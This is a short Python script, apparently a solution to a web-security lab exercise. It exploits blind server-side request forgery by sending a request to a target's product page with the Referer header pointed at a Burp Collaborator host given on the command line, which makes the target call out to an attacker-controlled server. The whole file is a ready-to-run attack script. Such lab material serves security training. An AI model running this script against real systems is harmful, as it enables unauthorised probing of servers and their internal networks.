import requests
import sys

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python script.py <url> <full collabolator url>")
        sys.exit(1)

burp_url = sys.argv[1]+'/product?productId=2'
colab_url = 'http://'+sys.argv[2]


burp_headers = {"Referer": colab_url}
requests.get(burp_url, headers=burp_headers)
